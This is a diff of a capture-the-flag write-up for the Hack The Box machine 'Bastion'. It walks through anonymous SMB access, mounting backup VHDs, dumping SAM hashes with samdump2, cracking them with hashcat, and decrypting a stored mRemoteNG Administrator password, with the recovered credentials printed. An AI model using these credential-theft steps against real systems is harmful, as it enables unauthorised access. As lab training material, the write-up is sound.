@@ -17,7 +17,7 @@ tags:
 # Initial Scan
 
 {% highlight plaintext %}
-root@kali:~/HTB/Bastion# nmap -sV -sC 10.10.10.134 -oA bastion.nmap                                                                 
+root@kali:~# nmap -sV -sC 10.10.10.134 -oA bastion.nmap                                                                 
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-22 08:26 EDT
 Nmap scan report for 10.10.10.134
 Host is up (0.053s latency).
@@ -64,7 +64,7 @@ Not much to look into aside from SMB.
 It's always worth testing to see if SMB permits null (aka anonymous) sessions. __We need a share__ to try authenticating to first. So we list out the shares.
 
 {% highlight plaintext %}
-root@kali:~/HTB/Bastion# smbclient -L \\10.10.10.134
+root@kali:~# smbclient -L \\10.10.10.134
 Enter WORKGROUP\root's password:
     Sharename       Type      Comment                                                                                           
     ---------       ----      -------                                                                                           
@@ -78,7 +78,7 @@ Enter WORKGROUP\root's password:
 `ADMIN$`, `C$`, and `IPC$` are all default shares. `Backups` is the only one that stands out. I attempt to authenticate to it with no credentials.
 
 {% highlight plaintext %}
-root@kali:~/HTB/Bastion# smbclient \\\\10.10.10.134\\Backups
+root@kali:~# smbclient \\\\10.10.10.134\\Backups
 Enter WORKGROUP\root's password:
 Try "help" to get a list of possible commands.
 smb: \> dir
@@ -108,53 +108,53 @@ smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\> dir
 
 {% endhighlight %}
 
-VHD files? Definitely something to look at. But `5418299392` blocks? That's over _two terabytes_. We need a way to enumerate the VHDs without downloading them entirely.
+Virtual hard disks? Definitely something to look at. But `5418299392` blocks? That's over two terabytes. We need a way to enumerate the VHDs without downloading them entirely.
 
 # Mounting shares and VHD files
 
 If we mount the share, we can view it as if it were part of our own file system.
 
 {% highlight plaintext %}
-root@kali:~/HTB/Bastion# mount -t cifs -o username=anonymous //10.10.10.134/Backups Backups
+root@kali:~# mount -t cifs -o username=anonymous //10.10.10.134/Backups Backups
 Password for anonymous@//10.10.10.134/Backups:  
 {% endhighlight %}
 
 ![](/images/bastion/image2.png)
 
-Those juicy VHD files, though, aren't readable this way. To browse through them, we have to mount those as well. For VHD files, we have to first install `guestmount`.
+Those juicy VHDs, though, aren't readable this way. To browse through them, we have to mount those as well. For VHD files, we have to first install `guestmount`.
 
 {% highlight plaintext %}
-root@kali:~/HTB/Bastion# apt-get install libguestfs-tools
+root@kali:~# apt-get install libguestfs-tools
 {% endhighlight %}
 
 Then we create a new directory as the mountpoint.
 
 {% highlight plaintext %}
-root@kali:~/HTB/Bastion# mkdir vhd1
+root@kali:~# mkdir vhd1
 {% endhighlight %}
 
 And we mount the VHD file.
 
 {% highlight plaintext %}
-root@kali:~/HTB/Bastion# guestmount --add "/root/HTB/Bastion/Backups/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd" --inspector --ro /root/HTB/Bastion/vhd1 -v
+root@kali:~# guestmount --add "/root/Backups/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd" --inspector --ro /root/vhd1 -v
 {% endhighlight %}
 
 Now we can browse through the file system as if it were part of our own.
 
 ![](/images/bastion/image3.png)
 
-_Note: One of the VHD files wouldn't mount properly. Turns out it isn't necessary to mount anyway._
+_Note: One of the VHDs wouldn't mount properly. Turns out it isn't necessary to mount anyway._
 
 Now with read access to the VHD, my first instinct is to go for the __flags__, but there's nothing at `C:\Users\L4mpje\Desktop` or `C:\Users\Administrator\Desktop`. So we clearly don't have the right access just yet.
 
-Next thing to do would be to search for __user credentials__ (remember the open SSH port?). After we've checked for credentials lying around in obvious places, it makes sense to try accessing the SAM and SECURITY files.
+Next thing to do would be to search for __user credentials__. After checking for credentials lying around in obvious places, I go for the SAM and SECURITY files.
 
 # SAM and SECURITY
 
 Depending on your version of Windows, these can be in a few different locations. Here, they're in `C:\Windows\System32\config`.
 
 {% highlight plaintext %}
-root@kali:~/HTB/Bastion/vhd1/Windows/System32/config# dir
+root@kali:~/vhd1/Windows/System32/config# dir
 < . . . snip . . . >
 SAM
 SAM.LOG
@@ -167,15 +167,15 @@ SECURITY
 I copy them from the mounted drive to my Kali box.
 
 {% highlight plaintext %}
-root@kali:~/HTB/Bastion/vhd1/Windows/System32/config# cp SAM /root/HTB/Bastion
-root@kali:~/HTB/Bastion/vhd1/Windows/System32/config# cp SYSTEM /root/HTB/Bastion
+root@kali:~/vhd1/Windows/System32/config# cp SAM ~
+root@kali:~/vhd1/Windows/System32/config# cp SYSTEM ~
 {% endhighlight %}
 
 To get the hashes, I use `samdump2` and pass the `SYSTEM` and `SAM` files as arguments.
 
 {% highlight plaintext %}
-root@kali:~/HTB/Bastion# samdump2 SYSTEM SAM -o hashes.txt
-root@kali:~/HTB/Bastion# cat hashes.txt
+root@kali:~# samdump2 SYSTEM SAM -o hashes.txt
+root@kali:~# cat hashes.txt
 *disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 *disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
@@ -184,7 +184,7 @@ L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
 The L4mpje hash takes seconds to crack with `hashcat`.
 
 {% highlight plaintext %}
-root@kali:~/HTB/Bastion# hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force
+root@kali:~# hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force
 {% endhighlight %}
 
 The password for use L4mpje is __bureaulampje__. The Administrator and Guest account hashes are marked as `*disabled*`, so this is the best we'll get.
@@ -212,7 +212,7 @@ l4mpje@BASTION C:\Users\L4mpje>type Desktop\user.txt
 
 # Privilege Escalation: mRemoteNG Credentials
 
-With Windows privilege escalation, if nothing stands out in the Users folder, I move on to checking what software is insatlled. Here, `mRemoteNG` stands out.
+With Windows privilege escalation, if nothing stands out in the Users folder, I move on to checking what software is installed. Here, `mRemoteNG` stands out.
 
 {% highlight plaintext %}
 l4mpje@BASTION C:\>dir "Program Files (x86)"                                    
@@ -245,18 +245,20 @@ A search for "mRemoteNG stored credentials", however, results in [exactly what w
 
 > mRemoteNG uses insecure methods for password storage and can provide droves of valid credentials during an assessment or competition.
 
-As the post shows, we can find an encrypted password (right beside __Username="Administrator"__) in C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.
+As the post explains, mRemoteNG is used to help manage remote connections (e.g., SSH, RDP). Credentials for these sessions may be stored insecurely in a file called `confCons.xml`. Lo and behold, we can find an encrypted password (right beside __Username="Administrator"__) in C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.
 
 {% highlight xml %}
 <Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Username="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==" Hostname="127.0.0.1" Protocol="RDP" . . . 
 {% endhighlight %}
 
-From here, you can find a handful of options available for decrypting an mRemoteNG password (including the one described in the previously linked-to [blog post](http://hackersvanguard.com/mremoteng-insecure-password-storage/)). 
+This specifies that the protocol is RDP, so we can assume that this credential would be reused for SSH as well.
+
+You can find a handful of options available for decrypting an mRemoteNG password (including the one described in the previously linked-to [blog post](http://hackersvanguard.com/mremoteng-insecure-password-storage/)). 
 
 What worked best for me was [mRemoteNG_Decrypt.py](https://github.com/haseebT/mRemoteNG-Decrypt). I copied the encrypted password and passed it as a string to get the plaintext credential.
 
 {% highlight plaintext %}
-root@kali:~/HTB/Bastion# python3 mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
+root@kali:~# python3 mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
 Password: thXLHM96BeKL0ER2
 {% endhighlight %}
 
